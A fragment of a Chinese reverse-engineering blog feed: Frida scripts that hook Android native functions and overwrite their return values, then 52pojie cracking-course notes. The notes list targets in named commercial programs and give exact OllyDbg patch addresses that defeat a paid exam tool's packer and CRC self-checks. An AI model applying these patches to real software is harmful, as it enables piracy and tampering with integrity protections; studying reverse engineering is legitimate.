返回值为int类型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    //下面这一句代码是指定要Hook的so文件名和要Hook的函数名，函数名就是上面IDA导出表中显示的那个函数名</span></span><br><span class="line"><span class="string">    Interceptor.attach(Module.findExportByName(&quot;libfridaso.so&quot;,&quot;Java_com_example_fridaso_FridaSoDefine_FridaSo&quot;),&#123;</span></span><br><span class="line"><span class="string">        //onEnter: function(args)顾名思义就是进入该函数前要执行的代码，其中args是传入的参数，一般so层函数第一个参数都是JniEnv，第二个参数是jclass，从第三个参数开始才是我们java层传入的参数</span></span><br><span class="line"><span class="string">        onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">            send(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">            send(&quot;args[2]=&quot; + args[2]); //打印我们java层第一个传入的参数</span></span><br><span class="line"><span class="string">            send(&quot;args[3]=&quot; + args[3]); //打印我们java层传入的第二个参数</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function(retval)&#123; //onLeave: function(retval)是该函数执行结束要执行的代码，其中retval参数即是返回值</span></span><br><span class="line"><span class="string">            send(&quot;return:&quot;+retval); //打印返回值</span></span><br><span class="line"><span class="string">            retval.replace(0); //替换返回值为0</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMessage</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;com.example.fridaso&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,printMessage)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="15-3-Frida-hook-返回值为String类型"><a href="#15-3-Frida-hook-返回值为String类型" class="headerlink" title="15.3 Frida hook 返回值为String类型"></a>15.3 Frida hook 返回值为String类型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    Interceptor.attach(Module.findExportByName(&quot;libfridaso.so&quot;,&quot;Java_com_example_fridasostring_fridaSoString_FridaSo&quot;),&#123;</span></span><br><span class="line"><span class="string">        onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">            send(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">            send(&quot;args[2]=&quot; + args[2]);</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function(retval)&#123;</span></span><br><span class="line"><span class="string">            send(&quot;return:&quot;+retval);</span></span><br><span class="line"><span class="string">            var env = Java.vm.getEnv(); //获取env对象，也就是native函数的第一个参数</span></span><br><span class="line"><span class="string">            var jstrings = env.newStringUtf(&quot;tamper&quot;); //因为返回的是字符串指针，使用我们需要构造一个newStringUtf对象，用来代替这个指针</span></span><br><span class="line"><span class="string">            retval.replace(jstrings); //替换返回值</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMessage</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;com.example.fridasostring&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,printMessage)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="15-4-Native-hook实战"><a href="#15-4-Native-hook实战" class="headerlink" title="15.4. Native hook实战"></a>15.4. Native hook实战</h2><p><a href="https://v5le0n9.github.io/posts/9f62af2.html#20-ill-intentions">攻防世界 ill-intentions</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-初识APK、Dalvik字节码以及Smali&quot;&gt;&lt;a href=&quot;#1-初识APK、Dalvik字节码以及Smali&quot; class=&quot;headerlink&quot; title=&quot;1. 初识APK、Dalvik字节码以及Smali&quot;&gt;&lt;/a&gt;1. 初识APK、Dalvik字节码以及Smali&lt;/h1&gt;&lt;p&gt;后缀名为&lt;code&gt;.apk&lt;/code&gt;是安卓手机app的格式。它的实质是一个ZIP压缩包，将它的后缀名修改为&lt;code&gt;.zip&lt;/code&gt;便可以看到内部的文件结构。解压出来后一般有以下文件：&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
    <category term="Android Killer" scheme="http://example.com/tags/Android-Killer/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解学习指导教程</title>
    <link href="http://example.com/posts/f398dcca.html"/>
    <id>http://example.com/posts/f398dcca.html</id>
    <published>2022-04-05T01:29:28.202Z</published>
    <updated>2022-04-11T05:27:47.654Z</updated>
    
    <content type="html"><![CDATA[<p>NO.1~NO.3在<a href="https://v5le0n9.github.io/posts/e2d652c5.html">第一课——脱壳基础</a>就已经实践完了，所以这个笔记从NO.4开始。这个笔记是在<a href="https://v5le0n9.github.io/posts/33a085c7.html">调试器使用教程</a>的基础上讲解，所以一定要保证自己已经了解OD的基本操作才推荐看这个笔记，但绝对会比论坛的大牛们讲解的详细。</p><span id="more"></span><h1 id="NO-4-破解实战"><a href="#NO-4-破解实战" class="headerlink" title="NO.4 破解实战"></a>NO.4 破解实战</h1><p>由于我是用户大牛在讲解的帖子上没有附上实验程序的下载链接，所以只能挑附上下载链接的进行详细记录，没有附上下载链接的只能讲解流程，详细请看我是用户的帖子。</p><h2 id="第一战：超级U盘锁"><a href="#第一战：超级U盘锁" class="headerlink" title="第一战：超级U盘锁"></a>第一战：超级U盘锁</h2><p><a href="https://www.52pojie.cn/thread-197281-1-1.html">https://www.52pojie.cn/thread-197281-1-1.html</a></p><p>ASPack壳+两处自校验+跳转爆破/赋值爆破</p><h2 id="第二战：豪杰屏幕录像机-v2-0"><a href="#第二战：豪杰屏幕录像机-v2-0" class="headerlink" title="第二战：豪杰屏幕录像机 v2.0"></a>第二战：豪杰屏幕录像机 v2.0</h2><p><a href="http://www.52pojie.cn/thread-197598-1-1.html">http://www.52pojie.cn/thread-197598-1-1.html</a></p><p>修改DLL</p><h2 id="第三战：LukoolRecorder2-7-5cn"><a href="#第三战：LukoolRecorder2-7-5cn" class="headerlink" title="第三战：LukoolRecorder2.7.5cn"></a>第三战：LukoolRecorder2.7.5cn</h2><p><a href="https://www.52pojie.cn/thread-197957-1-1.html">https://www.52pojie.cn/thread-197957-1-1.html</a></p><p>明码比较+跳转爆破/赋值爆破</p><h2 id="第四战：PilotEdit5-9"><a href="#第四战：PilotEdit5-9" class="headerlink" title="第四战：PilotEdit5.9"></a>第四战：PilotEdit5.9</h2><p><a href="https://www.52pojie.cn/thread-198203-1-1.html">https://www.52pojie.cn/thread-198203-1-1.html</a></p><p>跳转爆破</p><h2 id="第五战：文件夹加密精灵V5-3"><a href="#第五战：文件夹加密精灵V5-3" class="headerlink" title="第五战：文件夹加密精灵V5.3"></a>第五战：文件夹加密精灵V5.3</h2><p><a href="https://www.52pojie.cn/thread-198365-1-1.html">https://www.52pojie.cn/thread-198365-1-1.html</a></p><p>重启验证+跳转爆破+算法分析(MD5+程序加密算法)</p><h2 id="第六战：-帖子被删除了"><a href="#第六战：-帖子被删除了" class="headerlink" title="第六战：(帖子被删除了)"></a>第六战：(帖子被删除了)</h2><h2 id="第七战：XX注册税务师考试锦囊-完"><a href="#第七战：XX注册税务师考试锦囊-完" class="headerlink" title="第七战：XX注册税务师考试锦囊(完)"></a>第七战：XX注册税务师考试锦囊(完)</h2><p><a href="https://www.52pojie.cn/thread-199459-1-1.html">https://www.52pojie.cn/thread-199459-1-1.html</a></p><p>MPRESS壳+CRC相互校验+浮点错误+爆破+去除NAG</p><p>先运行一下程序，单独打开<code>ESIExamPlatform.exe</code>(主程序)是运行不了的，需要打开<code>ESPlatform.exe</code>再让它自行启动<code>ESIExamPlatform.exe</code>。查壳，两个都有MPRESS壳。</p><p>先解决两个程序的脱壳问题。这是个压缩壳，用ESP定律秒脱。脱完名字要改为原程序的名字。脱完壳后两个程序都显示CRC校验失败。</p><img src="/posts/f398dcca/4.7.2.png" class="" title="CRC校验失败"><p>载入<code>ESIExamPlatform.exe</code>搜索字符串把它跳过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00419DA1   . /7C 1C         jl short ESIExamP.00419DBF;nop掉</span><br><span class="line">00419DA3   . |68 206D4A00   push ESIExamP.004A6D20                   ;  495</span><br><span class="line">00419DA8   . |50            push eax</span><br><span class="line">00419DA9   . |E8 B4A40500   call ESIExamP.00474262</span><br><span class="line">00419DAE   . |83C4 08       add esp,0x8</span><br><span class="line">00419DB1   . |85C0          test eax,eax</span><br><span class="line">00419DB3   . |74 0A         je short ESIExamP.00419DBF;nop掉</span><br><span class="line">00419DB5   . |2B4424 14     sub eax,dword ptr ss:[esp+0x14]</span><br><span class="line">00419DB9   . |D1F8          sar eax,1</span><br><span class="line">00419DBB   . |3BC6          cmp eax,esi</span><br><span class="line">00419DBD   . |75 62         jnz short ESIExamP.00419E21;改为jmp</span><br><span class="line">00419DBF   &gt; \6A 00         push 0x0</span><br><span class="line">00419DC1   .  6A 00         push 0x0</span><br><span class="line">00419DC3   .  68 286D4A00   push ESIExamP.004A6D28                   ;   《考试锦囊》CRC校验失败，请杀毒后重新下载本系统！</span><br><span class="line">00419DC8   .  E8 02FB0300   call ESIExamP.004598CF</span><br></pre></td></tr></table></figure><p>载入<code>ESPlatform.exe</code>搜索字符串把它跳过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">004015DF     /74 22         je short ESPlatfo.00401603;nop掉</span><br><span class="line">004015E1     |8B4424 20     mov eax,dword ptr ss:[esp+0x20]          ;  kernel32.7C839AD8</span><br><span class="line">004015E5     |8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0</span><br><span class="line">004015E9     |7C 18         jl short ESPlatfo.00401603;nop掉</span><br><span class="line">004015EB     |51            push ecx</span><br><span class="line">004015EC     |50            push eax</span><br><span class="line">004015ED     |E8 727F0200   call ESPlatfo.00429564</span><br><span class="line">004015F2     |83C4 08       add esp,0x8</span><br><span class="line">004015F5     |85C0          test eax,eax</span><br><span class="line">004015F7     |74 0A         je short ESPlatfo.00401603;nop掉</span><br><span class="line">004015F9     |2B4424 20     sub eax,dword ptr ss:[esp+0x20]          ;  kernel32.7C839AD8</span><br><span class="line">004015FD     |D1F8          sar eax,1</span><br><span class="line">004015FF     |3BC6          cmp eax,esi</span><br><span class="line">00401601     |75 3E         jnz short ESPlatfo.00401641;改为jmp</span><br><span class="line">00401603     \6A 00         push 0x0</span><br><span class="line">00401605      6A 00         push 0x0</span><br><span class="line">00401607      68 00934400   push ESPlatfo.00449300                   ;   《考试锦囊》CRC校验失败，请杀毒后重新下载本系统！</span><br><span class="line">0040160C  |.  E8 2FCD0000   call ESPlatfo.0040E340</span><br></pre></td></tr></table></figure><p>此时单独运行<code>ESIExamPlatform.exe</code>会出现异常。</p><img src="/posts/f398dcca/4.7.1.png" class="" title="应用程序发生异常"><p>再次载入OD，找到<code>4757CA</code>，在<code>4757C5</code>下断，进入函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004757C5  |.  E8 D8F4FFFF   call ESIExamP.00474CA2</span><br><span class="line">004757CA  |.  83C4 14       add esp,0x14</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00474C56  |.  FF15 44B34900 call dword ptr ds:[&lt;&amp;kernel32.#IsSystemResum&gt;; [IsDebuggerPresent</span><br><span class="line">00474C5C  |.  6A 00         push 0x0                                     ; /pTopLevelFilter = NULL</span><br><span class="line">00474C5E  |.  8BD8          mov ebx,eax                                  ; |</span><br><span class="line">00474C60  |.  FF15 48B14900 call dword ptr ds:[&lt;&amp;kernel32.#SetVolumeMoun&gt;; \SetUnhandledExceptionFilter</span><br><span class="line">00474C66  |.  8D85 28FDFFFF lea eax,[local.182]</span><br><span class="line">00474C6C  |.  50            push eax                                     ; /pExceptionInfo = 00124C88</span><br><span class="line">00474C6D  |.  FF15 44B14900 call dword ptr ds:[&lt;&amp;kernel32.#UnregisterWai&gt;; \UnhandledExceptionFilter</span><br></pre></td></tr></table></figure><p>程序运行到<code>UnhandledExceptionFilter</code>处出错。因为这个函数前面没有跳转指令，所以要返回到父函数寻找跳转指令绕过这个子函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">004757AD  |. /74 07         je short ESIExamP.004757B6;绕过循环跳转就必须jmp,但同时异常也会被执行</span><br><span class="line">004757AF  |. |8B5D 0C       mov ebx,[arg.2]</span><br><span class="line">004757B2  |. |3BDF          cmp ebx,edi</span><br><span class="line">004757B4  |. |77 1E         ja short ESIExamP.004757D4;这个跳转实现虽然绕过异常，但一直在循环，直到不循环时也是要执行异常</span><br><span class="line">004757B6  |&gt; \E8 BB2D0000   call ESIExamP.00478576</span><br><span class="line">004757BB  |.  6A 16         push 0x16</span><br><span class="line">004757BD  |.  5E            pop esi                                      ;  ESIExamP.0047BEE6</span><br><span class="line">004757BE  |.  8930          mov dword ptr ds:[eax],esi</span><br><span class="line">004757C0  |&gt;  57            push edi;这个跳过来的是个jmp指令，没办法不执行，改nop也不行</span><br><span class="line">004757C1  |.  57            push edi</span><br><span class="line">004757C2  |.  57            push edi</span><br><span class="line">004757C3  |.  57            push edi</span><br><span class="line">004757C4  |.  57            push edi</span><br><span class="line">004757C5  |.  E8 D8F4FFFF   call ESIExamP.00474CA2;异常函数</span><br></pre></td></tr></table></figure><p>所以这两个跳转无论如何都不能够使这个异常不实现，继续找父函数。在堆栈窗口找到返回地址跟随。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00124F84  |0041B9E7  返回到 ESIExamP.0041B9E7 来自 ESIExamP.0047579E</span><br></pre></td></tr></table></figure><p>发现可以利用<code>0041B9D4</code>的跳转指令绕过异常函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0041B9D4  |. /74 14         je short ESIExamP.0041B9EA;改为jmp</span><br><span class="line">0041B9D6  |. |68 84744A00   push ESIExamP.004A7484                       ;  s</span><br><span class="line">0041B9DB  |. |6A 01         push 0x1</span><br><span class="line">0041B9DD  |. |68 FFFFFF00   push 0xFFFFFF</span><br><span class="line">0041B9E2  |. |E8 B79D0500   call ESIExamP.0047579E;异常函数</span><br><span class="line">0041B9E7  |. |83C4 0C       add esp,0xC</span><br><span class="line">0041B9EA  |&gt; \8D8C24 900000&gt;lea ecx,dword ptr ss:[esp+0x90]</span><br></pre></td></tr></table></figure><p>发现单独运行它又弹出一连串的“CRC校验失败，请重新下载本软件”的对话框。搜索字符串，在函数开头下断运行，发现<code>0043DB14</code>能绕过弹窗，<code>0043DB94</code>不能，因为je指令会绕过jnz指令。所以要在<code>0043DB14</code>改为jmp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0043DB14  |. /0F84 C0000000 je ESIExamP.0043DBDA;改为jmp</span><br><span class="line">...</span><br><span class="line">0043DB89  |. /74 0B         je short ESIExamP.0043DB96</span><br><span class="line">0043DB8B  |. |2B4424 14     sub eax,dword ptr ss:[esp+0x14]</span><br><span class="line">0043DB8F  |. |D1F8          sar eax,1</span><br><span class="line">0043DB91  |. |83F8 FF       cmp eax,-0x1</span><br><span class="line">0043DB94  |. |75 1A         jnz short ESIExamP.0043DBB0</span><br><span class="line">0043DB96  |&gt; \6A 00         push 0x0</span><br><span class="line">0043DB98  |.  6A 00         push 0x0</span><br><span class="line">0043DB9A  |.  68 F4EF4A00   push ESIExamP.004AEFF4                   ;  程序CRC校验失败，请重新下载本软件!</span><br><span class="line">0043DB9F  |.  E8 2BBD0100   call ESIExamP.004598CF</span><br></pre></td></tr></table></figure><p>但这样改就会跳转到“程序不完整”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0043DBDA  |&gt; \8B4E 20       mov ecx,dword ptr ds:[esi+0x20]</span><br><span class="line">0043DBDD  |.  6A 65         push 0x65                                ; /TimerID = 65 (101.)</span><br><span class="line">0043DBDF  |.  51            push ecx                                 ; |hWnd = 494F6396</span><br><span class="line">0043DBE0  |.  FF15 D8B54900 call dword ptr ds:[&lt;&amp;user32.#435&gt;]       ; \KillTimer</span><br><span class="line">0043DBE6  |.  6A 00         push 0x0</span><br><span class="line">0043DBE8  |.  6A 00         push 0x0</span><br><span class="line">0043DBEA  |.  68 1CF04A00   push ESIExamP.004AF01C                   ;  程序不完整，请重新下载!</span><br><span class="line">0043DBEF  |.  E8 DBBC0100   call ESIExamP.004598CF</span><br></pre></td></tr></table></figure><p>重新修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">0043DB77  |. /7C 1D         jl short ESIExamP.0043DB96;nop掉</span><br><span class="line">0043DB79  |. |68 206D4A00   push ESIExamP.004A6D20                   ;  495</span><br><span class="line">0043DB7E  |. |50            push eax</span><br><span class="line">0043DB7F  |. |E8 DE660300   call ESIExamP.00474262</span><br><span class="line">0043DB84  |. |83C4 08       add esp,0x8</span><br><span class="line">0043DB87  |. |85C0          test eax,eax</span><br><span class="line">0043DB89  |. |74 0B         je short ESIExamP.0043DB96;nop掉</span><br><span class="line">0043DB8B  |. |2B4424 14     sub eax,dword ptr ss:[esp+0x14]</span><br><span class="line">0043DB8F  |. |D1F8          sar eax,1</span><br><span class="line">0043DB91  |. |83F8 FF       cmp eax,-0x1</span><br><span class="line">0043DB94  |. |75 1A         jnz short ESIExamP.0043DBB0;修改为jmp</span><br><span class="line">0043DB96  |&gt; \6A 00         push 0x0</span><br><span class="line">0043DB98  |.  6A 00         push 0x0</span><br><span class="line">0043DB9A  |.  68 F4EF4A00   push ESIExamP.004AEFF4                   ;  程序CRC校验失败，请重新下载本软件!</span><br><span class="line">0043DB9F  |.  E8 2BBD0100   call ESIExamP.004598CF</span><br><span class="line">0043DBA4  |.  8B16          mov edx,dword ptr ds:[esi]               ;  ESIExamP.004AF6BC</span><br><span class="line">0043DBA6  |.  8B82 5C010000 mov eax,dword ptr ds:[edx+0x15C]</span><br><span class="line">0043DBAC  |.  8BCE          mov ecx,esi</span><br><span class="line">0043DBAE  |.  FFD0          call eax</span><br><span class="line">0043DBB0  |&gt;  C68424 880000&gt;mov byte ptr ss:[esp+0x88],0x2</span><br><span class="line">0043DBB8  |.  8B4424 14     mov eax,dword ptr ss:[esp+0x14]</span><br><span class="line">0043DBBC  |.  83C0 F0       add eax,-0x10</span><br><span class="line">0043DBBF  |.  8D48 0C       lea ecx,dword ptr ds:[eax+0xC]</span><br><span class="line">0043DBC2  |.  83CA FF       or edx,-0x1</span><br><span class="line">0043DBC5  |.  f0:0fc111     lock xadd dword ptr ds:[ecx],edx</span><br><span class="line">0043DBC9  |.  4A            dec edx</span><br><span class="line">0043DBCA  |.  85D2          test edx,edx</span><br><span class="line">0043DBCC  |.  7F 3D         jg short ESIExamP.0043DC0B;修不修改终将会绕过“程序不完整”弹窗</span><br><span class="line">0043DBCE  |.  8B08          mov ecx,dword ptr ds:[eax]               ;  ESIExamP.004C8790</span><br><span class="line">0043DBD0  |.  8B11          mov edx,dword ptr ds:[ecx]</span><br><span class="line">0043DBD2  |.  50            push eax</span><br><span class="line">0043DBD3  |.  8B42 04       mov eax,dword ptr ds:[edx+0x4]</span><br><span class="line">0043DBD6  |.  FFD0          call eax</span><br><span class="line">0043DBD8  |.  EB 31         jmp short ESIExamP.0043DC0B</span><br><span class="line">0043DBDA  |&gt;  8B4E 20       mov ecx,dword ptr ds:[esi+0x20]</span><br><span class="line">0043DBDD  |.  6A 65         push 0x65                                ; /TimerID = 65 (101.)</span><br><span class="line">0043DBDF  |.  51            push ecx                                 ; |hWnd = 00B1AF3C</span><br><span class="line">0043DBE0  |.  FF15 D8B54900 call dword ptr ds:[&lt;&amp;user32.#435&gt;]       ; \KillTimer</span><br><span class="line">0043DBE6  |.  6A 00         push 0x0</span><br><span class="line">0043DBE8  |.  6A 00         push 0x0</span><br><span class="line">0043DBEA  |.  68 1CF04A00   push ESIExamP.004AF01C                   ;  程序不完整，请重新下载!</span><br><span class="line">0043DBEF  |.  E8 DBBC0100   call ESIExamP.004598CF</span><br></pre></td></tr></table></figure><p>运行<code>ESPlatform.exe</code>可以正常启动<code>ESIExamPlatform.exe</code>出现主程序，单独启动<code>ESIExamPlatform.exe</code>也可出现主程序。至此，CRC校验全被清除。</p><p>在主程序点击一下功能看程序是否能正常工作。发现在点击“答题记录”或“统计曲线”或“习题集”时出现错误提示框，然后直接退出程序。</p><img src="/posts/f398dcca/4.7.3.png" class="" title="浮点数错误"><p>这是因为代码调用了浮点数，而程序在启动时因为缺省没有调用初始化浮点数的函数。程序启动阶段<code>___tmainCRTStartup</code>函数中调用了<code>__cinit</code>函数，在这个函数的第一个判断是校验浮点运算初始化函数指针所处的section是否为可写，如果可写的话就跳过浮点运算初始化函数，因此缺省情况下会直接显示出错信息并退出，如果该区段不可写，代码会调用浮点运算初始化函数，缺省的指向出错函数的指针会被替换成正常处理函数，因此可以正常运算。</p><p>又因为它会退出程序，Ctrl+G搜索<code>ExitProcess</code>下断，按下“统计曲线”-&gt;确定，程序停在断点处。在堆栈窗口返回到父函数。不断堆栈回溯再跟进来到这，看到下面有个<code>WriteFile</code>函数，说明<code>.MPRESS1</code>区段可写。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0047BC3C  |&gt; \68 10200100   push 0x12010</span><br><span class="line">0047BC41  |.  68 60174A00   push ESIExamP.004A1760                                   ;  Microsoft Visual C++ Runtime Library</span><br><span class="line">0047BC46  |.  57            push edi</span><br><span class="line">0047BC47  |.  E8 A4EF0000   call ESIExamP.0048ABF0                                   ;  错误函数</span><br><span class="line">0047BC4C  |.  83C4 0C       add esp,0xC</span><br><span class="line">0047BC4F  |.  EB 32         jmp short ESIExamP.0047BC83</span><br><span class="line">0047BC51  |&gt;  6A F4         push -0xC                                                ; /DevType = STD_ERROR_HANDLE</span><br><span class="line">0047BC53  |.  FF15 80B14900 call dword ptr ds:[&lt;&amp;kernel32.#GetStringTypeExA_433&gt;]    ; \GetStdHandle</span><br><span class="line">0047BC59  |.  8BD8          mov ebx,eax</span><br><span class="line">0047BC5B  |.  3BDE          cmp ebx,esi</span><br><span class="line">0047BC5D  |.  74 24         je short ESIExamP.0047BC83</span><br><span class="line">0047BC5F  |.  83FB FF       cmp ebx,-0x1</span><br><span class="line">0047BC62  |.  74 1F         je short ESIExamP.0047BC83</span><br><span class="line">0047BC64  |.  6A 00         push 0x0</span><br><span class="line">0047BC66  |.  8D45 F8       lea eax,[local.2]</span><br><span class="line">0047BC69  |.  50            push eax</span><br><span class="line">0047BC6A  